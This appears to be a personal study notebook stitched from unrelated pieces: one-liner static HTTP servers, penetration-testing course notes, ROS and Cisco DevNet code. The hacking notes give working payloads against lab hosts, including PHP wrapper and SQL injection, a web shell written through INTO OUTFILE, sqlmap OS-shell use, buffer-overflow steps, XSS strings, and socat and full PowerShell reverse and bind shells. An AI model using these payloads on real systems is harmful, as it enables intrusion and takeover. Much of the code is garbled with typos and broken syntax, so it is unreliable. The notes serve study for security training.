Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
httpd = SocketServer.TCPServer(("",PORT),Handler)
print "serving at port", PORT
httpd.serve_forever()

python2 webserver.py
clear 




Big List of one liner HTTP Server static 

Each of these commands will run an ad hoc http static server in your current (or specified) directory, available at http://localhost:8000. Use this power wisely.

[Discussion on reddit](http://www.reddit.com/r/webdev/comments/1fs45z/list_of_ad_hoc_http_server_oneliners/).

### Python 2.x

```shell
$ python -m SimpleHTTPServer 8000
```

### Python 3.x

```shell
$ python -m http.server 8000
```

### Twisted <sub><sup>(Python)</sup></sub>

```shell
$ twistd -n web -p 8000 --path .
```

Or:

```shell
$ python -c 'from twisted.web.server import Site; from twisted.web.static import File; from twisted.internet import reactor; reactor.listenTCP(8000, Site(File("."))); reactor.run()'
```

Depends on [Twisted](http://twistedmatrix.com/trac/wiki/Downloads).

### Ruby

```shell
$ ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 8000, :DocumentRoot => Dir.pwd).start'
```

Credit: [Barking Iguana](http://barkingiguana.com/2010/04/11/a-one-line-web-server-in-ruby/)

### Ruby 1.9.2+

```shell
$ ruby -run -ehttpd . -p8000
```

Credit: [nobu](https://gist.github.com/willurd/5720255#comment-855952)

### adsf <sub><sup>(Ruby)</sup></sub>

```shell
$ gem install adsf   # install dependency
$ adsf -p 8000
```

Credit: [twome](https://gist.github.com/willurd/5720255/#comment-841393)

*No directory listings.*

### Sinatra <sub><sup>(Ruby)</sup></sub>

```shell
$ gem install sinatra   # install dependency
$ ruby -rsinatra -e'set :public_folder, "."; set :port, 8000'
```

*No directory listings.*

### Perl

```shell
$ cpan HTTP::Server::Brick   # install dependency
$ perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>8000); $s->mount("/"=>{path=>"."}); $s->start'
```

Credit: [Anonymous Monk](http://www.perlmonks.org/?node_id=865239)

### Plack <sub><sup>(Perl)</sup></sub>

```shell
$ cpan Plack   # install dependency
$ plackup -MPlack::App::Directory -e 'Plack::App::Directory->new(root=>".");' -p 8000
```

Credit: [miyagawa](http://advent.plackperl.org/2009/12/day-5-run-a-static-file-web-server-with-plack.html)

### Mojolicious <sub><sup>(Perl)</sup></sub>

```shell
$ cpan Mojolicious::Lite   # install dependency
$ perl -MMojolicious::Lite -MCwd -e 'app->static->paths->[0]=getcwd; app->start' daemon -l http://*:8000
```

*No directory listings.*

### http-server <sub><sup>(Node.js)</sup></sub>

```shell
$ npm install -g http-server   # install dependency
$ http-server -p 8000
```

*Note: This server does funky things with relative paths. For example, if you have a file `/tests/index.html`, it will load `index.html` if you go to `/test`, but will treat relative paths as if they were coming from `/`.*

### node-static <sub><sup>(Node.js)</sup></sub>

```shell
$ npm install -g node-static   # install dependency
$ static -p 8000
```

*No directory listings.*

### PHP <sub><sup>(>= 5.4)</sup></sub>

```shell
$ php -S 127.0.0.1:8000
```

Credit: [/u/prawnsalad](http://www.reddit.com/r/webdev/comments/1fs45z/list_of_ad_hoc_http_server_oneliners/cad9ew3) and [MattLicense](https://gist.github.com/willurd/5720255#comment-841131)

*No directory listings.*

### Erlang

```shell
$ erl -s inets -eval 'inets:start(httpd,[{server_name,"NAME"},{document_root, "."},{server_root, "."},{port, 8000},{mime_types,[{"html","text/html"},{"htm","text/html"},{"js","text/javascript"},{"css","text/css"},{"gif","image/gif"},{"jpg","image/jpeg"},{"jpeg","image/jpeg"},{"png","image/png"}]}]).'
```

Credit: [nivertech](https://gist.github.com/willurd/5720255/#comment-841166) (with the addition of some basic mime types)

*No directory listings.*

### busybox httpd

```shell
$ busybox httpd -f -p 8000
```

Credit: [lvm](https://gist.github.com/willurd/5720255#comment-841915)

### webfs

```shell
$ webfsd -F -p 8000
```

Depends on [webfs](http://linux.bytesex.org/misc/webfs.html).

### IIS Express

```shell
C:\> "C:\Program Files (x86)\IIS Express\iisexpress.exe" /path:C:\MyWeb /port:8000
```

Depends on [IIS Express](http://www.iis.net/learn/extensions/introduction-to-iis-express/iis-express-overview).

Credit: [/u/fjantomen](http://www.reddit.com/r/webdev/comments/1fs45z/list_of_ad_hoc_http_server_oneliners/cada8no)

*No directory listings. `/path` must be an absolute path.*

# Meta

If you have any suggestions, drop them in the comments below or on the reddit discussion. To get on this list, a solution must:

1. serve static files using your current directory (or a specified directory) as the server root,
2. be able to be run with a single, one line command (dependencies are fine if they're a one-time thing),
3. serve basic file types (html, css, js, images) with proper mime types,
4. require no configuration (from files or otherwise) beyond the command itself (no framework-specific servers, etc)
5. must run, or have a mode where it can run, in the foreground (i.e. no daemons)




continued 
---------------------

PHP Wrappers 
--------------------
data wrappers
---------------------

 
 10.11.0.22/menu.php?file=data:text/plain,hello world 
 app treated the data wrapper as a file 
 lets see how far we can push this 
  with some php code 
  
  
  10.11.0.22/menu.php?file=data:text/plain,<?php echo shell.exec("dir") ?>
  
  
  
  it works 
  ulalallalallalalala
  
  
  now exploit lfi without any local files 
  
  
  
  SQL Injection 
  ----------------------------
  unsanitized user inputs 
  -----------------------------
  passed to the database 
  -------------------------------
  insering or retrieving the data 
  -------------------------------------
  introduce own malicious data 
  -----------------------------------
  complete server compromise
  
  
  
  
  
  
  lets discuss SQL injection with MariaDB 
  ----------------------------------------------
  
  Basic SQL 
  --------------
  queries are instructions
  select is the basic interaction 
  
  
  SELECT * FROM users;
  condition with WHERE
  
  INSERT 
  UPDATE 
  DELETE 
  
  ---------------------------
  Indentifying 
  SQL Injection vuln 
  -------------------------------
 $query = "select * from users where username = '$user' and password ='$pass'";
 $user = '
 since single qoutes  
  are used as a  delimiter 
   
   queried as an empty username 
   and a misplaced string of and password equals 
   a syntax errors
   
   
   To gain access to the admin page 
   ------------------------------------------
   Authentication Bypass
   -------------------------
   able to inject our code 
   on favour  ?
   
   when we convert normal sql query
   like this 
    
	select * from users where name= 'tom' or 1=1;#' and password = 'jones';
	
   
   ' OR 1=1;#
   
   
   subvert logic by this 
   
pound character is a comment marker
    so it is effectively left with this 
	
	select * from users where name = ' tom ' or 1=1;
	  
	  
	 1=1 is always true 
so all rows is returned 

creates a valid password check 

all records 

here we saw 
logic Bypass Authentication

we dont know what to except getting app source code

to limit number of records 
------------------------------

Username 
---------------
tom' or 1=1 LIMIT 1;#

Password 
------------------------- 

#blank 


Nice login in bypassed
--------------------------------
code which executes  this 
---------------------------------

is available everywhere
 on internet
 
  experimentation is very important 
  
  Enumerating the database 
 -----------------------------------
 
 $sql = "SELECT id, name, text FROM feedback WHERE id=". $_GET['id'];
 
 
 10.11.0.22/debug.php 
 10.11.0.22/debug.php?id='
  == > potential sql injection vuln 
  
  
  
  Column Number Enumeration 
  --------------------------------
  ORDER BY 
  -----------
  
  10.11.0.22/debug.php?id=1 order by 1
  
  
  find the request in burpsuite and sednto intruder
   under repeater 
   url encoded 
   
   that means spaces will be %20 
   this sdhould not affect our query 
   response is normal 
   search for erro in response 
    no matches 
	for errors
	increase the orderby clause until we get a error
	
	errors tells us unknown column 
	
	
	using UNIONS STATEMENT 
	---------------------------
	 understanding the layout  column 
	 -----------------------------------
	 10.11.0.22/debug.php?id=1 union all select 1,2,3
	 it will return one row with three column 
	 
	 column 1 isnt displayed 
	 but 2 and 3 is displayed 
	 3 column conatin more spaces 
	 logical space for future exploitation 
	 
	  
	  Extracting the Data from database 
	  ----------------------------------
	  
  MariaDB 
  

10.11.0.22/debug.php?id=1 union all select 1,2,@@version 

@@version gives u the version of the database

u will get it in the 3 field 


10.11.0.22/debug.php?id=1 union all select 1,2,user()

it reveals user 
that means tell us whether root or not 

10.11.0.22/debug.php?id=1 union all select 1,2,table_name from information _schema.tables

   
   it will give u a lot of info
   about tables in databases 
   
  
  10.11.0.22/debug.php?id=1 union all select 1,2,column_name from 
  information_schema.columns where table_name='users'
  
  
  10.11.0.22/debug.php?id=1 union all select 1, username, password from users 
  
  usernames and password in clear texts
  
  
  
  From SQL Injection to Code Execution 
  -----------------------------------------
  
  
  push this vulnerability 
  file permission 
   
   READ AND WRITE 
   -----------------------------
   LOAD_FILE FUNCTION 
   ------------------
   
   10.11.0.22/debug.php?id=1 union all select 1,2,load_file('c:/Windows/Sytem32/drivers/etc/hosts')
   
   
   INTO OUTFILE FUNCTION 
   ---------------------------
	
	c:/xampp/htdocs
	
	 10.11.0.22
	
	10.11.0.22/debug.php?id=1 union all select 1,2,"php echo '<pre>'. shell_exec($_GET['cmd']). '</pre>'; ?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
	
	10.11.0.22/backdoor.php?cmd=ipconfig
	
	code execution 
	
	
	Automating SQL Injection 
	----------------------------
	
	   sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"
	
	multipl e request to probe for sql injection 
	what database software to use 
	clear 
	 
	 sqlmap -u  http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump 
	 setting mysql will work well enough 
	 it will dump the entire database 
	 clear 
	 
	 sqlmap -u  http://10.11.0.22/debug.php?id=1  -p "id" --dbms=mysql --os-shell
	
	to execute a shell in the attack 
	 
	 
	 in shell 
	 ipconfig 
	 effective foothole 
	 we recommend practicing with sqlmap 
	 consider it !! with burpsuite and wireshark 
	 
	 
	 ----------------------------------------------------------------------------------------
	 
	 
	 WINDOWS BUFFER OVERFLOW
	 ---------------------------
	 Discovery the Vulnerability 
	 ------------------------------
	 engineering techniques or  fuzzing
	 -------------------------------------------
	  Fuzzing the SSH 
	  --------------------
	  
	  Open services.msc  console 
	  right click on Sync Breeze Enterprise 
	  and select start 
	  
	  
	  vuln discovery 
	  ----------------------
	  wireshark 
	  filtern
	  
	  
	  
	  host 10.11.0.22 and host 10.11.0.4
	  and navigate to syncbreeze enterprise 
	  
	  we ll go to 10.11.0.22/login 
	  now try to login with some credential s and 
	  find the syncbreeze service in wireshark 
	  
	  follow its TCP Stream 
	  
	  
	  leafpad fuzzer.py 
	  syncbreeze doesnt show up in Immunity debugger 
	  
	  so lets check that process in TCPView 
	  open TCPView 
	  ------------------
	  lets deselect resolve address
	    here we can find syncbrs.exe
		
		
	  it does nt appear in immunity debugger 
	  because of system privileges (HIGH)
	  immunity debugger is running in regular mode 
	  
	  relaunch it with run as admin 
	  
	  now Attach Sync Breeze 
	  
	  resume execution by pressing F9 
	  now at the same time we run  fuzzer.py 
	  
	  when the username has reached its limitations
	  debugger presents it with Access Violation 
	  
	  this type of access violation is through memory operation 
	  that overwrite data over the intended memory area 
	  
	  when on a stack it is stack overflow 
	  fairly anaqueous oversight 
	  
	   restart the service through  sync breeze Enterprise 
	   
	   attach syncbrs.exe 
	   
	   press F9 
	   
	   
	   
	   Win32 Buffer Overflow Exploit 
	   ------------------------------------
	   Replicating the Crash 
	   ---------------------------
	   controlling the EIP 
	   --------------------------
	   need to know the exact location in which it is landing  the EIP 
	   -------------------------------------------------------------------
	   
	   two ways to do this 
	   binary tree analysis 
	   400 a and 400 bs 
	   
	  by this we know the eip is covered by first half or last half 
	  
	  
	  now 200 as 200 bs 200 cs 
	  if we get C 
	  then  we know EIP contains in 600-800
	  
	  7 itertaions it should happen 
	  
	  faster way 
	  ------------------
	  sufficient long string 
	  that consist of non repeating 
	  4 bytes chunks  as our  fuzzer inputs
	  
	  then after we can take unique point where it was covered 
	  
	  msf-pattern_create -l 800 
	  now replace this new unique string in fuzzer input
	  this is our inputbuffer now 
	  msf-pattern_offset -l 800 -q our point of eip covered
	  
	  
	  A * 780 
	  B * 4 
	  C * 16
	  
	  
	  now the eip hits the offset 
	  and now A overflowed at 780 bytes
	  and after the B overpass and hold now 
	  the EIP 
	  
	  that is BBBB 
	  42424242 that is 4 B 
	  
	  
	  Locating space for our shellcode
	  -------------------------------------
	  where we can redirect 
	  understand where this code will fit 
	  lik a reverse shell as part  of the  input 
	  
	  
	  ESP contains buffer of  C 
	  so we understand 
	  jump esp call of EIP 
	  
	  
	  
	   this is a convernient location for shellcode 
	   
	   a standard shell will need 300 - 400 bytes of space 
	   ESP loads with only 16 bytes so we need to 
	   increase the bufffer overflow  without crashing it 
	   
	  
	  next we give n a grp of ds to cover the location after eip 
	  do value of 
	  d = "D" * (1500 - len(filter) - len(eip) - len(offset))
	  
	  we stop here and concentrate 
	  
	  
	  0x00 ==> nullbyte 
	  truncates the strcopy operation (memory)
	  
	  0x0D = return after a http request 
	  end of an http fields
	  
	  
	  0x00 - 0xFF  send all and deal with crash 
	  
	  right click esp and follow in dump
	  
	  0x0A = => a line feed  // bad character 
	  0x00
	  0x0A
	  0x0D
	  0x25
	  0x26
	  0x2B
	  0x3D
	  these all mangle program flow 
	  
	  !mona modules 
	  safe seh 
	  aslr 
	  nx-compact 
	  
	  
	  memory protection 
	  --------------------------
	  00 40 00 00 all intruction starts at 
	  
	  msf nasm_shell 
	   pass the instruction it gives  u the opcode 
	   in hex
	   
	   
	   !mona find -s "\xff\xe4" -m "libspp.dll"
	    find the address  and go for it 
		using goto addredd menu in immunity debugger arrow icon last 
		
		
		breakpoint set using F2
		
		then F9 to resume 
		 
		 F7 for single step 
		 here a bunch of D 's-
		 
		 
		 shellcode with decoder stub 
		 decoder needs to grab the address and the shellcode address to 
		 process 
		 
		 gatherin those 
		 sequence of assembly instr 
		 commonly referred to GetPC 
		 
		 move ther vakue of eip 
		  to other register 
		   
		   thos using shikat ga nai 
		   have unfortunate side effect at writing ssome data 
		   at and and around 
		    the top of the stack 
			
			
		   wide -landing pad 
		   auch that any one landing on this pad it willcontinue on with the payload 
		   
		   precede with NOP instr 
		   
		   NOP SLIDE 
		   OR NOP SLED 
		   for cpu clide 
		   
		   
		   
		   ExitProcess 
		   if the prgm is threaded 
		   
		   then use Exit Thread
		   ExitThread 
		   
		   no prob for usual operation 
		   without bringin down the service 
		   
		   EXITFUNC = Thread 
		   
		   --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
		   
		   XSS Attack Type  methods
		    Alert 
			document.cookie
			
			variable="
			document.location 
			onload 
			?name=>"'><IMG SRC = "javascript.alert('XSS')">
			
			
			SQL INJECTION Keywords 
			-------------------------
			'OR"='
			username and password
			
			admin'--
			username
			
			union select 1, 'user', 'passwd' 1-
			username 
			
			';drop table users-
			username 
			
			aaaaaaaaaaaaaaaaaaaaaaaaa'
			'
			username and password
			
			
			http://localhost/script?';EXEC+master.. xp_cmdshell+'dir'
			
			http://localhost/script?';EXEC+master..xp_servicecontrol+'start',+'server';--
			
			
			-----------------------------------------------------------------------------------------------------------------------
			ROS Programming 
			-------------------
			basic code block 
			
			<launch> 
			 <group ns="/"> 
			  <param name="rosversion" command="rosversion roslaunch" /> 
			  <param name="rosdistro" command="rosversion -d" /> 
			  <node pkg="rosout" type="rosout" name="rosout" respawn="true"/> 
			 </group> 
			</launch>


			
			rosinput list 
			cd
			
			 
			 URDF TAGS 
			 XML based robot description
		

ROS FILE SYSTEM 
---------------------
config: All configuration files that are used in this ROS package are kept in this folder. This folder is created by the user and it is a common practice to name the folder config to keep the configuration files in it.•include/package_name: This folder consists of headers and libraries that we need to use inside the package.•script: This folder keeps executable Python scripts. In the block diagram, we can see two example scripts.•src: This folder stores the C++ source codes.•launch: This folder keeps the launch files that are used to launch one or more ROS nodes.•msg: This folder contains custom message definitions.•srv: This folder contains the services definitions.•action: This folder contains the action files. We will see more about these kind of files in the next chapter.•package.xml: This is the package manifest file of this package.•CMakeLists.txt: This files contains the directives to compile the package.



	commands to work with ROS packages 
-----------------------------------------------------
catkin_create_pkg
rospack 
catkin_name
rosdep 



bash like command 
roscd 
roscp 
rosed 
rosrun 
	
	
roscd navigation 


ROS messages 
-----------------
sg headers 
-----------------
unint32 seq 
time stamp 
string frame_id


rosmsg show std_msgs/Header 



Nodes
master 
parameter server
Messages 
Topics 
Services 
Logging





rosnode info 
rosnode kill 
rosnode list 
rosnode machine 
rosnode ping 
rosnode cleanup 



ROSMSG 
----------------

rosmsg show 
rosmsg list 
rosmsg md5 
rosmsg package 
rosmsg packages 



TCP ROS 


rostopic bw /topic 
//bandwidth 

rostopic echo  /topic 
rostopic find /message_type
rsotopic hz /topic 
 //hz is publishing rate 
 
 rostopic info /topic 
 rostopic list 
 rostopic pub /topic_message_type args
 rosopic type /topic 
 
 
 
 rosservice call /service args 
 rosservice find /service_type
 rosservice info /services 
 rosservice list 
 rsoservice type /service
 rosservice uri /service 
 
 ROSRPC URI 
 
 
 rosbag record topic 1 topic 2 -o bag_name 
 rosbag play bag_name 
 
 
 
 ROS Parameter
 --------------------
 XMLRPC Types 
 ---------------------
 •32-bit integers•
 Booleans\
 •Strings•
 Doubles•
 ISO8601 dates
 •Lists
 •Base64-encoded binary data


 rosparam set  paramter_name value 
 rosparam get paramter _name 
 rosparam load 
 rosparam dump 
 rosparam delete 
 rosparam list 
 
 
 
 start ros master and ros parameter server by using command called roscore 
 
 ROS Master 
 ROS paramter server 
 rosout logging nodes 
 
  
 rosout will collect log messages from other ROS nodes and store them in a log file 
 and will also rebroadcast the collected log message to another topic 
 
 rosout topic is published by ROS nodes by using ROS client libraries  such as roscpp and rospy 
 
 
 
roscore 
roscore.xml 


content of roscore.xml 

<launch> 
 <group ns="/"> 
  <param name="rosversion" command="rosversion roslaunch" /> 
  <param name="rosdistro" command="rosversion -d" /> 
  <node pkg="rosout" type="rosout" name="rosout" respawn="true"/> 
 </group> 
</launch> 




rostopic list 
/rosout 
/rosout_agg
rosparam list 
/rosdistro 
/roslaunch/uris/host_robot_virtualbox__51189
/rosversion 
/run_id 





rosservice list 

/rosout/get_loggers
/rosout/set_logger_level 



Cisco Devnet 
continued 
-------------------------------------------------------------------------
from __future__ import print_function 
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
from scp import SCPClient 
import json 
import os 
from ipaddress import IPV4Interface, ip_address
from argparse import ArgumentParser, REMAINDER 

def connect(ip,password):
try:
ssh = SSHClient()
ssh.set_missing_host_key_policy(AutoAddPolicy())
print('Initiating SSH to {}...'.format(ip))
ssh.connect(ip,port=2222,username="maglev",password-password, look_for_keys=False)
t = ssh.get_transport()
t.set_keepalive(5)
return ssh 

except AuthenticationException:
print("Unable")

def validate_op(stdout, stderr):
stderr._set_mode('rb')
status = stderr.read().decode('ascii').strip("\n")
if not status :
stdout._set_mode('rb')
opstatus = stdout.read().decode('ascii').strip("\n")
print(opstatus)
else:
print(status)



def get_cluster_members(dnac, maglev):


print("Getting other cluster members")
with connect(dnac, maglev) as conn:
cmd = "etcdctl ls /maglev/config | grep node |sed -e 's#$#/network#' |xargs -n1 etcdctl get | jq -r '"
jq = '.[] |.inet | .host_ip + "/" + .netmask'
final = "' | grep-v '^[/]$'"
full_cmd = cmd + jq + final
stdin,stdout,stderr = sonn.exec_command(full_cmd)
iplist = stdout.readlines()

try:
dnacip = ip_address(unicode(dnac,"utf-8"))
except NameError:
dnacip = ip_address(dnac)

network = none

for ip in iplist:
ipa = IPV4Interface(ip.strip())
print(ipa)
if dnacip in ipa.network:
network = ipa.network

if network == None:
print("ERROR")

targets = []
for ip in iplist :
ipa = IPV4Iterface(ip.strip())
if ipa.network == network:
targets.append(str(ipa.ip))
rteurn targets 

def copy_files(conn.dnac, json_summary, dir):
path = "{}/{}".format(dir,dnac)
print(""\n****Checking local destination folder : {}".format(path))
if not os.path.isdir(path):
try:
os.mkdir(path)
except OSError:
print("Creation")
else:
print("Success")

scp = SCPClient(conn.get_transport())
scp.get(json_summary['json_summary']['report-name'], local_path=path)
scp.get(json_summary['json_summary']['logfile-name'], local_path=path)



def run_aura(dnac, maglev, admin_pass,admin_user,nopull,dir,rest):
others = ''
if rest ! = []:
others = ''.join(rest[1:])

with connect(dnac,maglev) as conn:
if not nopull:
print(proxy )
try:
stdin, stdout, stderr = conn.exec_command("cat /etc/systemd/system/docker.service.d/http*_proxy.conf |awk '/HTTPS_PROXY/ {print}'")
stdout.set_mode('rb')
proxy = stdout.read().decode('ascii').strip("\n")
proxy = proxy.split("=")(2)
except 	IndexError:

print("no proxy ")
proxy = ''



-----------------------------to be continued 
------------------------------------------------------------------------------------
simple authentication Python function 
------------------------------------------------

pip install requests



import requests
from requests.auth import HTTPBasicAuth
from dnac_config import DNAC_IP, USERNAME, PASSWORD

requests.packages.urllib3.disable_warnings()

def get_auth_token():
"""
Building out Auth request. Using requests.post to make a call to the Auth Endpoint
"""
# Endpoint URL
url = 'https://sandboxdnac.cisco.com/dna/system/api/v1/auth/token'
# Make the POST Request

resp = requests.post(url, auth=HTTPBasicAuth(username, PASSWORD), verify = false)
token = resp.json()['Token']
print(token)
return token 
if __name == "__main__":
get_auth_token()

-------------------------------------------------------------------------------------------------------

Area	Technology
Boot and Provisioning	POAP, PXE
Package and Application Management	RPM
Open Interfaces	Bash, Broadcom Shell, Python, Guest Shell
Extensibility	Containers
Configuration Management Tools	Puppet, Chef, CFEngine, Ansible
Programmable Interface Agents	NETCONF, RESTCONF, gRPC
NX-OS APIs	NX-API
Event Management and Notification	Embedded Event Manager
The next steps take a closer look at the technology which makes Nexus switches a powerful product.



------------------------------------------------------------------------------------------------------------

python 
from cli import * 
import json 
cli('configure terminal; interface loopback 5; no shut')
intflist =json.loads(clid('show interface brief'))
i=0
while i < len(intflist['TABLE_interface']['ROW_interface']):
intf = intflist['TABLE_interface']['ROW_interface'][i]
i=i +1
if intf['state'] == 'up':
print intf['interface']


secure guest shell-
-----------------------------
dohost "show cdp global" "show ssh server"

capabilities 
------------------
Access to the network over Linux network interfaces.
Access to Cisco Nexus bootflash.
Access to Cisco Nexus volatile tmpfs.
Access to Cisco Nexus CLI.
Access to Cisco NX-API REST.
The ability to install and run python scripts.
The ability to install and run 32-bit and 64-bit Linux applications.



secure Linux technology  for kernel segregation 
such as SMACK (Simplified Mandatory Access Control Kernel )

--------------------------------------------------------------------------------

from nnclient import manager 
from pprint import pprint 
nxv = manager.connect(host="{IP}", port = 830
username="cisco", password="cisco", device_params={'name'='nexus'}, hostkey_verify=False)
pprint(nxv.get_config(source='running').data_xml, indent = 4)


output  =>
('<?xml version="1.0" encoding="UTF-8"?><data '
 'xmlns="urn:ietf:params:xml:ns:netconf:base:1.0" '
 'xmlns:if="http://www.cisco.com/nxos:1.0:if_manager" '
 'xmlns:nfcli="http://www.cisco.com/nxos:1.0:nfcli" '
 'xmlns:nxos="http://www.cisco.com/nxos:1.0" '
 'xmlns:vlan_mgr_cli="http://www.cisco.com/nxos:1.0:vlan_mgr_cli">\n'
 '        <System>\n'
 '            <ac-items>\n'
 '                <adminSt>enabled</adminSt>\n'
 '            </ac-items>\n'
 '            <acct-items>\n'
 '                <adminSt>enabled</adminSt>\n'
 '                <sessionId>0</sessionId>\n'
 '                <sessionNum>0</sessionNum>\n'
 '                <sourceId>0</sourceId>\n'
 '            </acct-items>\n'
 '            <actrl-items>\n'
 '                <adminSt>enabled</adminSt>\n'
 '                <inst-items>\n'
 '                    <adminSt>enabled</adminSt>\n'
 '                </inst-items>\n'
 '            </actrl-items>\n'
 '            <address>0.0.0.0</address>\n'
 '            <adjacency-items>\n'
 '                <adminSt>enabled</adminSt>\n'
 '                <inst-items>\n'
 '                    <adminSt>enabled</adminSt>\n'
 '                    <dom-items>\n'
 '                        <Dom-list>\n'
 '                            <name>management</name>\n'
 '                            <db-items>\n'
 '                                <Db-list>\n'
 '                                    <type>ipv6</type>\n'
 '                                </Db-list>\n'
 '                                <Db-list>\n'
 '                                    <type>ip</type>\n'
 '                                </Db-list>\n'
 '                            </db-items>\n'
 '                        </Dom-list>\n'
 '                        <Dom-list>\n'
 '                            <name>default</name>\n'
 '                            <db-items>\n'
 '                                <Db-list>\n'
 '                                    <type>ipv6</type>\n'
 '                                </Db-list>\n'
 '                                <Db-list>\n'
 '                                    <type>ip</type>\n'
 '                                </Db-list>\n'
 '                            </db-items>\n'
 '                        </Dom-list>\n'
 '                    </dom-items>\n'
 '                </inst-items>\n'
 '            </adjacency-items>\n'
 '            <arp-items>\n'
 '                <adminSt>enabled</adminSt>\n'
 '                <inst-items>\n'
 '                    <adjLoggingLevel>error</adjLoggingLevel>\n'
 '                    <adminSt>enabled</adminSt>\n'
 '                    '
 '<allowStaticArpOutsideSubnet>disabled</allowStaticArpOutsideSubnet>\n'
 '                    <cacheLimit>174080</cacheLimit>\n'
 '                    <cacheSyslogRate>1</cacheSyslogRate>\n'
 '                    <dom-items>\n'
 '                        <Dom-list>\n'
 '                            <name>management</name>\n'
 '                            <encap>unknown</encap>\n'
 '                            <if-items>\n'
 '                                <If-list>\n'
 '                                    <id>mgmt0</id>\n'
 '                                    <adminSt>enabled</adminSt>\n'
 '                                    '
 
 
 EEM supported Actions 
 --------------------------
 Run any commands
 update a counter
 Log an Exception 
 Force the shutdown of any module 
 Reload the device
 Shut down specified modules because the power is over budget 
 Generate a syslog message 
 generate a call Home event 
 Generate an SNMP notifications
 Use the default action for the system policy 
 
 
 
 Policies 
 -----------------
 event manager applet TEST
 evennt cli match "conf t"
 action 1.0 snmp-trap strdata "configuration change"
 action 2.0 event-default 
 
 
 --------------------------------------ROS programming Starts 
 ------------------------------------------------------------------------
 
 Creating a ROS Package 
 --------------------------------
mkdir -p ~/catkin_ws/src

source /opt/ros/kinetic/setup.bash 
cd ~/catkin_ws/src
catkin_init_workspace 

cd ~/catkin_ws
catkin_make

echo "source ~/catkin_ws/devel/setup.bash" >> ~/.bashrc
source ~/.bashrc


rosbuild and catkin are both in existence 
CMake (cross platform Make)

catkin_create_pkg package_name dependency1 dependency2
catkin_create_pkg mastering_ros_demo_pkg roscpp std_msgs actionlib actionlib_msgs 


catkin_make

---------------------------------------------------
Creating ROS nodes 
-------------------------
#include "ros/ros.h"
#include "std_msgs/Int32.h"
#include<iostream>
int main(int argc, char **argv)
{
ros::init(argc, argv, "demo_topic_publisher");
ros::NodeHandle node_obj;
ros::Publisher number_publisher = node_obj.advertise<std_msgs::Int32>("/numbers",10);
ros::Rate loop_rate(10);
int number_count = 0;
while(ros::ok())
{
std_msgs = Int32 msg;
msg.data = number_count;
ROS_INFO("%d",msg.data);
number_publisher.publish(msg);
ros::spinOne();
loop_rate.sleep();
++number_count;

}
return 0;

}


create and edit Cmakelist.txt
------------------------------------


include_directories( 
   include 
   ${catkin_INCLUDE_DIRS} 
   ${Boost_INCLUDE_DIRS} 
) 
#This will create executables of the nodes 
add_executable(demo_topic_publisher src/demo_topic_publisher.cpp) 
add_executable(demo_topic_subscriber src/demo_topic_subscriber.cpp) 
 
#This will generate message header file before building the target 
add_dependencies(demo_topic_publisher mastering_ros_demo_pkg_generate_messages_cpp) 
add_dependencies(demo_topic_subscriber mastering_ros_demo_pkg_generate_messages_cpp) 
 
#This will link executables to the appropriate libraries  
target_link_libraries(demo_topic_publisher ${catkin_LIBRARIES}) 
target_link_libraries(demo_topic_subscriber ${catkin_LIBRARIES}) 


We can add the preceding snippet to create a new a CMakeLists.txt file for compiling the two codes.
The catkin_make command is used to build the package. We can first switch to a workspace:$ cd ~/catkin_ws  
Build mastering_ros_demo_package as follows:$ catkin_make   
We can either use the preceding command to build the entire workspace, or use the the -DCATKIN_WHITELIST_PACKAGES option. With this option, it is possible to set one or more packages to compile:$ catkin_make -DCATKIN_WHITELIST_PACKAGES="pkg1,pkg2,..."  
Note that is necessary to revert this configuration to compile other packages or the entire workspace. This can be done using the following command:$ catkin_make -DCATKIN_WHITELIST_PACKAGES=""    
If the building is done, we can execute the nodes. First, start roscore:$ roscore  
Now run both commands in two shells. In the running publisher:$ rosrun mastering_ros_demo_package demo_topic_publisher   
In the running subscriber:$ rosrun mastering_ros_demo_package demo_topic_subscriber  
We can see the output as shown here:



socat -TCP4:10.11.0.22:110
sudo socat TCP4-LISTEN:443 STDOUT 

sudo socat TCP4-LISTEN::443,fork file:secret_password.txt
socat TCP4:10.11.0.4:443 file:recieved_secret_password.txtx;create


SOCAT Reverse Shells
----------------------------
socat -d -d TCP4-LISTEN:443 STDOUT
-d -d increases verbosity 

socat TCP4:10.11.0.22:443 EXEC:/bin/bash


openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 
-days 365 -out perm.crt 


cat bind_shell.key bind_shell.crt > bind_shell.pem 
  
  sudo socat OPENSSL-LISTEN:443, cert=bind_shell.pem, verify=0,fork EXEC:/bin/bash
  
  socat - OPENSSL :10.111.0.4:443,verify=0
  
  exit 
  
  Get-ExecutionPolicy
  
  sudo cp /usr/share/windows-resource/binaries/wget.exe /var/www/html/
  sudo systemctl start apache2
  
  
               
cls
wget -V 


 
 powerhsell reverse shell 
 -------------------------------
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
 while(($i = $stream.Read($bytes,0, $bytes.Length))-ne 0)
 {
 $data = (New-Object -TypeName
 System.Text.ASCIIEncoding).GetString($bytes,0,$i);
 $sendback = (iex $data 2>&1  | Out-String );
 $sendback2 = $sendback + 'PS' + (pwd).Path + '> ';
 $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
 $stream.Write($sendbyte,0,$sendbyte.Length);
 $stream.Flush();
 
 }
 $client.close();
 
 


Bind shells
------------------
powershells
------------------
$listener = New-Object Sysetm.Net.Sockets.TcpListener('0.0.0.0',443);
$listener.start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.read($bytes,0,$bytes.length))
-ne 0)
{
$data = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString($bytes,0,$i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback+ 'PS' + (pwd).Path + '>';
$sendbyte = ([text.encoding]::ASCII).GetBytes(#sendback2);
$stream.Write($sednbyte,0,$sendbyte.Length);
$stream.Flush()

};
$client.Close();
$listener.Stop();



powercat -p for port 
-c for ip 
-i for the file 
 -e execute 
 -g generate a payload 
